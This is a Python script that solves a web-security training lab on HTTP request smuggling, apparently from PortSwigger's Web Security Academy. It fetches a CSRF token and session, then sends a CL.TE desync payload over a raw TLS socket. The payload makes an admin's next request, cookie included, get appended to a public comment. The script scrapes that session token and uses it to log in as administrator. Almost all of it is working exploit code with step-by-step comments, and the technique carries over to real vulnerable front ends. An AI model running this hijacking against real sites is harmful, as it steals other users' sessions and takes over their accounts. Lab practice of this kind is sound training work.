import sys
import requests
from bs4 import BeautifulSoup
import socket
import ssl
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""Lab: Exploiting HTTP request smuggling to capture other users' requests"""


"""To upload a comment, you must extract the csrf token and session value, and they must be correct. 
                No comment will be uploaded if any of them are incorrect."""

def GET_CSRF_TOKEN(target_host):

    try:
        #path of the page comment
        path_csrf="/post?postId=3"
        #full path for the page 
        target_host="https://"+target_host+path_csrf
        response=requests.get(target_host,verify=False) # To retrieve the session and CSRF value from the response, send a get request.
        ## Check if a Gateway Timeout error indicates the host is not responding. 
        if "Gateway Timeout" in response.text:
            print("(-) No response received from the server .")
            sys.exit()
        else:    
            soup=BeautifulSoup(response.text,"html.parser") # parse the content of the response
            csrf_token=soup.find("input",{"name":"csrf"})["value"] # Find  The csrf value, can be found in an input with the name csrf and the value it represent the csrf
            session=response.cookies.values()[0] # extract session value from our responose 

            return csrf_token,session # return the two values to the executvie function
    
    except Exception as err:
        print(f'(-) {err}')



def Extract_session(session):
    try:
# Identify all the sentences that begin with'session' and equal one or more characters or numbers. And get the last from the list because find all return a list        
        session_value=re.findall("session=(.+)",session)[-1].strip()
# If the session value is less than 32 characters, we need to increase the length of the content-length header for the smuggling requests.
        if len(str(session_value).strip())==32:
            return session_value
        else:
            print('(-) Invalid session value length. Check Content-Length in the smuggling request . ')
            sys.exit()
    except Exception as err:
        print(f'(-) {err}')
        sys.exit()
    


# Executive function #############################################################""
"""
                                            Payload Explanation:
This payload exploits a CL.TE vulnerability by using a `Content-Length` header to trick the front-end server 
and `Transfer-Encoding: chunked` to desynchronize the back-end server's interpretation.

1. **Front-end Parsing (Content-Length):**
   - The `Content-Length: 320` header ensures the front-end server processes the entire payload as part of the current request.

2. **Back-end Parsing (Transfer-Encoding: chunked):**
   - The `Transfer-Encoding: chunked` header is used to terminate the request body with `0\r\n\r\n`, 
     signaling the end of the chunked body to the back-end server. This creates a smuggled request that starts 
     after the terminating `0`.

3. **Smuggled Request:**
   - The smuggled request is a POST request to add a comment. 
   - The comment is strategically placed at the end of the body (e.g., "comment=testGET HTTP..."). so that the next request sent by the admin (visiting the site) gets 
     appended to it and submitted as part of the malicious comment.

4. **Challenges with Content Length:**
   - Determining the correct content length (`930` in this case) is critical. 
   - The length must be sufficient to account for the admin's request that gets appended to the smuggled payload 
     without truncation or overlap.
   
   - Once the admin visits the target page, their session is reflected in the comment, enabling us to extract 
     sensitive information such as the admin's session token."""
        
def CL_TE_CAPTURE_ADMIN_SESSION(target_host,target_port,csrf_token,session):

    payload=(
        "POST / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 320\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "POST /post/comment HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"Cookie: session={session}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 930\r\n"
        "\r\n"
        f"csrf={csrf_token}&postId=3&name=test&email=test@gmail.com&site=&comment=testbab"
    )

    # By including some fake headers, we can increase the length of our request to 930 or something similar. if we send less information
    #The host will wait for the remaining for the rest , which will result in a timeout.
    header={"Cookie": f"session={session}",
                   'Sec-Ch-Ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                        "Sec-Ch-Ua-Mobile": "?0",
                        "Sec-Ch-Ua-Platform": "Linux",
                        "Upgrade-Insecure-Requests": "1",
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
                        ,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
                        ,"Sec-Gpc": "1"
                        ,"Accept-Language": "en-US,en;q=0.6"
                        ,"Sec-Fetch-Site": "same-origin"
                        ,"Sec-Fetch-Mode": "navigate"
                        ,",Sec-Fetch-User": "?1"
                        ,"Sec-Fetch-Dest": "document"
                        ,"Accept-Encoding": "gzip, deflate, br"
                        ,"Priority": "u=0, i"
                          ,"Sec-Gpc": "1"
                        ,"Accept-Language1": "en-US,en;q=0.6"
                        ,"Sec-Fetch-Site1": "same-origin"
                        ,"Sec-Fetch-Mode1": "navigate"
                        ,"Sec-Fetch-Us":"2" ,"Accept-Language1": "en-US,en;q=0.6"
                        ,"Sec-Fetch-Site11": "same-origin"
                        ,"Sec-Fetch-Mode11": "navigate"
                        ,"Sec-Fetch-Us1":"2"
                       }
    try:
        # A while loop is used to send the payload multiple times to ensure that the admin request is reflected in our comment.
        while True:
            # Create SSL context for HTTPS
        #Creates a secure environment for HTTPS communication.
            context_ssl=ssl.create_default_context()
             #Opens a connection to the server (target_host) on the specified port (target_port).
            with socket.create_connection((target_host,target_port)) as sock:
                #Wraps the socket connection with encryption for secure data transfer.
                with context_ssl.wrap_socket(sock,server_hostname=target_host) as securesock:
                
                        securesock.sendall(payload.encode(errors="ignore",encoding='utf-8'))#sending the payload 
                        response_summgled=securesock.recv(4096)#recving data  
                     #check if we have 200 OK response 
                        if "HTTP/1.1 200 OK" in response_summgled.decode():
                            # send a get request to the comment page 
                            normal_response=requests.get("https://"+target_host+"/post?postId=3",verify=False,headers=header,allow_redirects=False)
                            # When we receive a 200 OK, it indicates that the admin request was added to the comment. When we receive a 302, it indicates that our request was added to the comment .--302 response handled by (else) statment--
                            if normal_response.status_code == 200:
                                print('(+) Admin request added to comment .')
                                print('(+) Extacting session value from the comment . ....')
                                #send the response the function to extracte the value for us
                                sessionAdmin_value=Extract_session(normal_response.text)
                                print('(+) Admin Session Value Found : %s '%sessionAdmin_value)
                                # To trick the site into believing we are the admin, send a get request using the admin session value in the cookie.
                                header={"Cookie": f"session={sessionAdmin_value}"}
                                response_login=requests.get("https://"+target_host+"/my-account",verify=False,headers=header)
                                #If we get an "administrator" in response, it indicates that we have successfully logged in to the admin account.
                                if "administrator" in response_login.text:
                                    print("(+) Lab Solved Successfully .")
                                    sys.exit()
                                else:
                                    print('(-) Lab Not solved check again and run the script')
                                    exit()
                        
                            else:
                                # Check if the lab has already been solved.
                                if "Congratulations, you solved the lab!" in response_summgled.decode():
                                    print('(-) The lab has already been solved.')
                                    sys.exit()
                                # mean that 302 response was given to us and our comment was added to the page.
                                else:
                                    print('(-) Our standard request was added to the comment. . ')

                            
                            

                                  #check if the host down or not  
                        elif "504 Gateway Timeout" in response_summgled.decode():  #check if the host down or not 
                            print("(-) No response received from the server .")
                            sys.exit()

                        else:
                            print('(-) Error !')
                            sys.exit()
    except Exception as err:
        print(f'(-) {err}')



#main function
def main():
    try:
        #check  the argv that we give 
        if len(sys.argv) !=2:
            print('(+) Usage %s <url>'%sys.argv[0])
            print('(+) Example %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net'%sys.argv[0])
            sys.exit(1)
        
        target_host=sys.argv[1]
        target_port=443
        print('(+) Starting .....')
        csrf_token,session=GET_CSRF_TOKEN(target_host)
        CL_TE_CAPTURE_ADMIN_SESSION(target_host,target_port,csrf_token,session)
    except Exception as err:
        print(f'(-) {err}')



if __name__=="__main__":
    main()
